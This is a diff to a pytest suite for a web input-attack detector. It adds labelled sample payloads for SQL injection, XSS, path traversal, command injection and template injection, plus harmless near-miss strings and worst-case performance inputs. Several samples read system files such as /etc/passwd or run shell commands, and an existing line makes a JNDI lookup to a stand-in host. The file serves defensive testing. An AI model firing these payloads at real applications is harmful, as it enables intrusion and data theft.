@@ -18,6 +18,7 @@ import pytest
 
 from app.detection import KINDS, PATTERNS, inspect, kinds, matches, normalize
 from app.detection.detector import MAX_EXCERPT_CHARS, MAX_TOTAL_CHARS, MAX_VALUE_CHARS, MAX_VALUES
+from app.detection.patterns import RETIRED
 
 # --- Attacks are flagged as their type -----------------------------------------------
 
@@ -37,6 +38,15 @@ ATTACKS = {
         "%27%20OR%201%3D1--",  # URL-encoded once
         "%2527%20OR%201%3D1--",  # URL-encoded twice
         "1 /*!50000UNION*/ /*!50000SELECT*/ 1",  # MySQL version comments
+        # Added in tuning (backend #199), one per new pattern:
+        "1 OR 1=1",  # SQLI-07: numeric injection, no quote
+        "' HAVING 1=1#",  # SQLI-08
+        " ORDER BY 3#",  # SQLI-08: counting columns
+        "1 AND (SELECT COUNT(*) FROM users)>0",  # SQLI-09
+        "CASE WHEN 1=1 THEN 1 ELSE 0 END",  # SQLI-09
+        "1 AND @@version",  # SQLI-10
+        "1 AND extractvalue(1,concat(0x7e,version()))",  # SQLI-10
+        '")or true#',  # SQLI-11
     ],
     "xss": [
         "<script>alert(1)</script>",
@@ -50,6 +60,11 @@ ATTACKS = {
         "&lt;script&gt;alert(1)&lt;/script&gt;",  # HTML entities
         "\uff1cscript\uff1ealert(1)",  # full-width < and >
         "%3Cscript%3Ealert(1)%3C/script%3E",
+        '" autofocus onfocus=alert(1) //',  # XSS-06
+        "'-alert(1)-'",  # XSS-07
+        '<div style="width:expression(alert(1))">',  # XSS-08
+        "<html:script>alert(1)</html:script>",  # XSS-09
+        "%u003Cscript%u003Ealert(1)",  # %u escapes (normalization)
     ],
     "path_traversal": [
         "../../../etc/passwd",
@@ -60,6 +75,11 @@ ATTACKS = {
         "file:///proc/self/environ",
         "C:\\Windows\\System32\\drivers\\etc\\hosts",
         "../secret.txt%00.png",
+        "..0x5c..0x5cetc0x5cpasswd",  # PATH-04
+        "/./.././.././../etc",  # PATH-04
+        "/etc/apache2/apache2.conf",  # PATH-05
+        "C:\\Program Files\\MySQL\\my.ini",  # PATH-05
+        "..%u2215..%u2215etc%u2215issue",  # PATH-04 and PATH-06
     ],
     "command_injection": [
         "; cat /etc/passwd",
@@ -71,6 +91,11 @@ ATTACKS = {
         "/bin/sh -i",
         "cmd.exe /c dir",
         "cat${IFS}/etc/passwd",
+        "& ipconfig /all",  # CMD-04
+        "; netstat -an",  # CMD-04
+        "|/usr/bin/id",  # CMD-05
+        '<!--#exec cmd="ls"-->',  # CMD-05
+        "system('id')",  # CMD-05
     ],
     "format_string": [
         "{0.__class__.__init__.__globals__}",
@@ -86,6 +111,10 @@ ATTACKS = {
         "${jndi:ldap://evil.example/a}",
         "#{7*7}",
         "<%= 7*7 %>",
+        "{{''.__class__.__mro__[1].__subclasses__()}}",  # FMT-06 and FMT-07
+        "{{request|attr('application')}}",  # FMT-07
+        "{$smarty.version}",  # FMT-07
+        "%u%u%u%u",  # FMT-08
     ],
 }
 
@@ -122,6 +151,18 @@ HARMLESS = [
     "Order #42 for table 7",
     "Back in 10 -- grabbing coffee",
     "We're closed; type your name on the list",
+    # Near misses for the patterns added in tuning (backend #199):
+    "${price} on the old menu",  # a plain field, not an expression (FMT-05)
+    "#{order_id} on the ticket",
+    "{{customer}} is a mail-merge field",  # FMT-06
+    "Files are in C:\\Users\\Shared\\Schedules",  # people's own folder (PATH-05)
+    "dog & cat sitter, ask Ana",  # "&" then an everyday word (CMD-04)
+    "pens, paper, etc, issue them Monday",  # "etc" then punctuation (PATH-06)
+    "or 2 if needed",  # "or" then a number, no comparison (SQLI-07)
+    "in case when it rains then we close else we open",  # no END (SQLI-09)
+    "please confirm (by Friday)",  # no string-ending character first (XSS-07)
+    "Jo's facial expression (smile) in the photo",  # no ":" first (XSS-08)
+    "wait... ok... fine",  # ellipses are not steps up (PATH-04)
 ]
 
 
@@ -144,6 +185,7 @@ def test_tricky_harmless_text_is_not_flagged(value: str) -> None:
         ("UNION/**/SELECT", "union select"),  # an inline comment where a space would go
         ("/*!50000UNION*/", " union "),  # a MySQL version comment keeps its text
         ("a \t\n  b", "a b"),  # whitespace runs become one space
+        ("%u003Cb%u003E", "<b>"),  # IIS-style %u escapes (tuning, backend #199)
     ],
 )
 def test_normalization_undoes_disguises(original: str, normalized: str) -> None:
@@ -247,6 +289,7 @@ def test_every_pattern_has_a_stable_id_and_a_known_type() -> None:
         assert re.fullmatch(r"(SQLI|XSS|PATH|CMD|FMT)-\d{2}", pattern.id), pattern.id
         assert pattern.kind in KINDS, pattern.id
     assert len({p.id for p in PATTERNS}) == len(PATTERNS)
+    assert not {p.id for p in PATTERNS} & set(RETIRED)  # a retired ID is never reused
     assert {p.kind for p in PATTERNS} == set(KINDS)  # every type has patterns
 
 
@@ -308,6 +351,17 @@ WORST_CASES = [
     "%25" * (MAX_VALUE_CHARS // 3),
     "&amp;" * (MAX_VALUE_CHARS // 5),
     "a" * MAX_VALUE_CHARS,
+    # Near matches for the patterns added in tuning (backend #199).
+    "/." * (MAX_VALUE_CHARS // 2),
+    "..%" * (MAX_VALUE_CHARS // 3),
+    "%u" * (MAX_VALUE_CHARS // 2),
+    "case when " * (MAX_VALUE_CHARS // 10),
+    "${a." + "a" * (MAX_VALUE_CHARS - 4),
+    "{{a" + "_" * (MAX_VALUE_CHARS - 3),
+    "etc\ufffd" * (MAX_VALUE_CHARS // 4),
+    "' or 1" * (MAX_VALUE_CHARS // 6),
+    '" on' * (MAX_VALUE_CHARS // 3),
+    "%d%" * (MAX_VALUE_CHARS // 3),
 ]
 # The budget for one value through the WHOLE detector (normalize and every pattern). Real
 # values take well under a millisecond; this is generous so a slow CI machine does not
